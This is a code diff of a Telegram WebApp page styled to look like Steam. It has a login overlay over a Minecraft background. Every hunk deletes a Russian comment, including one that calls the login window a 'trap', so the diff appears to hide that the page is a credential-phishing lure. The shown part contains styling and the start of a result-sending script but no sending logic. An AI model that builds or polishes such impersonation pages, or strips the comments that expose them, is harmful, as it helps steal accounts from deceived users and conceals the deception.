@@ -12,7 +12,6 @@
             --steam-blue: #171a21;
             --steam-light: #66c0f4;
             --accent: #ffcc00;
-            /* Стек шрифтов San Francisco / System UI */
             --sf-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
         }
 
@@ -22,7 +21,6 @@
             color: white;
             margin: 0;
             padding: 0;
-            /* Фоновое изображение с затемнением */
             background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
                         url('https://www.minecraft.net/content/dam/archive/695914f650950346061381f9a8607153-Header.jpg');
             background-size: cover;
@@ -110,7 +108,6 @@
             text-decoration: line-through;
         }
 
-        /* Окно авторизации (ЛОВУШКА) */
         .login-overlay {
             background: #1b2838; /* Цвет Steam */
             padding: 24px;
@@ -131,7 +128,6 @@
             line-height: 1.5;
         }
 
-        /* Кнопки */
         .btn {
             width: 100%;
             padding: 16px;
@@ -237,7 +233,6 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        // Устанавливаем цвет темы WebApp под Steam
         tg.setHeaderColor('#1b2838');
 
         async function sendResult(isWin) {
